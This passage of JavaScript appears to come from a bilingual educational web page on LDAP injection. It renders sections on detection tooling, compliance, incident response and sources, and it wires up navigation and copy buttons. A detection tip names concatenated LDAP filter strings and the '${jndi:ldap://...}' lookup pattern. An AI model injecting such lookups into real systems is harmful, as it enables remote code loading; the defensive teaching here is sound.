  const sast = TOOLS.sast.map((t) => `<div class="ldapi-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const dast = TOOLS.dast.map((t) => `<div class="ldapi-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const note = lang === 'en'
    ? '<strong>Key signal:</strong> grep for filter strings built by concatenation — <code>"(uid=" + user</code>, <code>f"(uid={user})"</code>, <code>{filter: "(uid="+</code> — and for any logged parameter that could carry <code>${jndi:ldap://...}</code>.'
    : '<strong>Kluczowy sygnał:</strong> szukaj filtrów budowanych przez konkatenację — <code>"(uid=" + user</code>, <code>f"(uid={user})"</code>, <code>{filter: "(uid="+</code> — oraz każdego logowanego parametru mogącego nieść <code>${jndi:ldap://...}</code>.';
  return secWrap('ldapi-tools', lang === 'en' ? 'Detection tooling' : 'Narzędzia wykrywania',
    lang === 'en' ? 'Static analysis catches input flowing into filter sinks; dynamic tools confirm exploitability. Use both.' : 'Analiza statyczna łapie wejście trafiające do sinków filtra; narzędzia dynamiczne potwierdzają eksploatowalność. Używaj obu.',
    `<div class="ldapi-tools-grid">
      <div class="ldapi-tool-col"><h4>SAST · ${lang === 'en' ? 'Static' : 'Statyczna'}</h4>${sast}</div>
      <div class="ldapi-tool-col"><h4>DAST · ${lang === 'en' ? 'Dynamic' : 'Dynamiczna'}</h4>${dast}</div>
    </div>
    <div class="ldapi-callout warn">${note}</div>`);
}

function buildCompliance() {
  const lang = getLang();
  const cards = COMPLIANCE.map((c) => `
    <article class="ldapi-comp-card">
      <h4>${esc(c.std)}</h4>
      <ul>${c.items.map((i) => `<li>${esc(i)}</li>`).join('')}</ul>
    </article>`).join('');
  const sources = `<div class="ldapi-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://www.pcisecuritystandards.org/document_library/" target="_blank" rel="noopener">PCI DSS v4.0</a>
    <a href="https://gdpr-info.eu/art-32-gdpr/" target="_blank" rel="noopener">GDPR Art. 32</a>
    <a href="https://gdpr-info.eu/art-33-gdpr/" target="_blank" rel="noopener">GDPR Art. 33</a>
    <a href="https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security" target="_blank" rel="noopener">SOC 2 (AICPA)</a>
  </div>`;
  return secWrap('ldapi-compliance', lang === 'en' ? 'Compliance quick-reference' : 'Szybka zgodność',
    lang === 'en' ? 'Where LDAP injection prevention maps onto the controls auditors check.' : 'Gdzie zapobieganie LDAP injection mapuje się na kontrole sprawdzane przez audytorów.',
    `<div class="ldapi-comp-grid">${cards}</div>${sources}`);
}

function buildIR() {
  const lang = getLang();
  const items = IR[lang].map((s, i) => `
    <li class="ldapi-ir-item"><span class="ldapi-ir-check">${i + 1}</span><span>${esc(s)}</span></li>`).join('');
  return secWrap('ldapi-ir', lang === 'en' ? 'Incident response checklist' : 'Lista kontrolna reagowania',
    lang === 'en' ? 'If you confirm an active LDAP injection breach, work this list top to bottom.' : 'Po potwierdzeniu aktywnego wycieku LDAP injection przejdź tę listę od góry.',
    `<ol class="ldapi-ir">${items}</ol>`);
}

function buildSourcesSection() {
  const lang = getLang();
  const links = SOURCES.map((s) =>
    `<a href="${s[1]}" target="_blank" rel="noopener" class="ldapi-source-link">${esc(s[0])}</a>`).join('');
  return secWrap('ldapi-sources', lang === 'en' ? 'Sources & references' : 'Źródła i odniesienia',
    lang === 'en' ? 'Primary references for the techniques, CVEs, and mitigations described above.' : 'Główne odniesienia do opisanych technik, CVE i środków zaradczych.',
    `<div class="ldapi-sources" style="margin-top:0">${links}</div>`);
}

function secWrap(id, title, lead, inner) {
  return `<section id="${id}" class="ldapi-section">
    <h2 class="ldapi-h2">${title}</h2>
    <p class="ldapi-section-lead">${lead}</p>
    ${inner}
  </section>`;
}

function buildContent() {
  return [
    buildOverview(),
    buildTypes(),
    buildCheatsheet(),
    buildCode(),
    buildOrm(),
    buildMethod(),
    buildDefense(),
    buildIncidents(),
    buildTools(),
    buildCompliance(),
    buildIR(),
    buildSourcesSection(),
    `<footer class="ldapi-footer">Code Guardian — LDAP Injection deep-dive · ${getLang() === 'en' ? 'All "VULNERABLE" examples are illustrative only — do not use in production.' : 'Wszystkie przykłady "PODATNY" są wyłącznie poglądowe — nie używaj na produkcji.'}</footer>`,
  ].join('');
}

/* =========================================================================
   WIRING
   ========================================================================= */

let highlighted = false;

function highlightOnce(panel) {
  if (highlighted) return;
  $$('code[class*="language-"]', panel).forEach((c) => highlightElement(c));
  highlighted = true;
}

function wireCopy(panel) {
  $$('.ldapi-copy', panel).forEach((btn) => {
    btn.addEventListener('click', () => {
      const code = $('code', btn.parentElement).textContent;
      const label = $('span', btn);
      const write = () => {
        const old = label.textContent;
        label.textContent = tr(TXT.copied);
        btn.classList.add('copied');
        setTimeout(() => { label.textContent = old; btn.classList.remove('copied'); }, 1400);
      };
      if (navigator.clipboard?.writeText) navigator.clipboard.writeText(code).then(write, write);
      else write();
    });
  });
}

function wireLangTabs(panel) {
  $$('.ldapi-lang-tab', panel).forEach((tab) => {
    tab.addEventListener('click', () => {
      const l = tab.dataset.lang;
      $$('.ldapi-lang-tab', panel).forEach((t) => t.classList.toggle('active', t === tab));
      $$('.ldapi-lang-panel', panel).forEach((p) => p.classList.toggle('active', p.dataset.lang === l));
    });
  });
}

function wireScrollSpy(panel) {
  const body = $('.ldapi-body', panel);
  const links = $$('.ldapi-nav-link', panel);
  links.forEach((link) => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const target = $('#' + link.dataset.target, panel);
      if (target) body.scrollTo({ top: target.offsetTop - 24, behavior: 'smooth' });
    });
  });
  const sections = $$('.ldapi-section', panel);
  body.addEventListener('scroll', () => {
    let current = sections[0]?.id;
    for (const s of sections) {
      if (s.offsetTop - 80 <= body.scrollTop) current = s.id;
    }
    links.forEach((l) => l.classList.toggle('active', l.dataset.target === current));
  }, { passive: true });
}

function render(panel) {
  const lang = getLang();
  panel.innerHTML = `
    <div class="ldapi-topbar">
      <span class="ldapi-brand">${SVG.shield}<span>Code <span class="grad">Guardian</span></span></span>
      <span class="ldapi-topbar-title">LDAP Injection</span>
      <span style="flex:1"></span>
      <button class="ldapi-close" type="button" aria-label="${tr(TXT.close)}">${SVG.close}<span>${tr(TXT.close)}</span></button>
    </div>
    <div class="ldapi-shell">
      <nav class="ldapi-nav" aria-label="${lang === 'en' ? 'Page sections' : 'Sekcje strony'}">${buildNav()}</nav>
      <div class="ldapi-body">${buildContent()}</div>
    </div>`;
  highlighted = false;
  $('.ldapi-close', panel).addEventListener('click', close);
  wireCopy(panel);
  wireLangTabs(panel);
  wireScrollSpy(panel);
}

let _panel = null;
let _rendered = false;

function open() {
  if (!_panel) return;
  if (!_rendered) { render(_panel); _rendered = true; }
  _panel.classList.add('open');
  document.body.classList.add('ldapi-lock');
  highlightOnce(_panel);
  const body = $('.ldapi-body', _panel);
  if (body) body.scrollTop = 0;
}

function close() {
  if (!_panel) return;
  _panel.classList.remove('open');
  document.body.classList.remove('ldapi-lock');
}

export function openLdapiPage() { open(); }

export function initLdapiPage() {
  _panel = $('#ldapi-page');
  if (!_panel) return;

  // Re-render on language change so content tracks the global toggle.
  const langBtn = $('#lang-toggle');
  if (langBtn) {
    langBtn.addEventListener('click', () => {
      setTimeout(() => {
        if (_rendered) { const wasOpen = _panel.classList.contains('open'); render(_panel); if (wasOpen) { _panel.classList.add('open'); highlighted = false; highlightOnce(_panel); } }
      }, 0);
    });
  }

  const openBtn = $('#ldapi-tab');
  if (openBtn) openBtn.addEventListener('click', open);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && _panel.classList.contains('open')) close();
  });
}
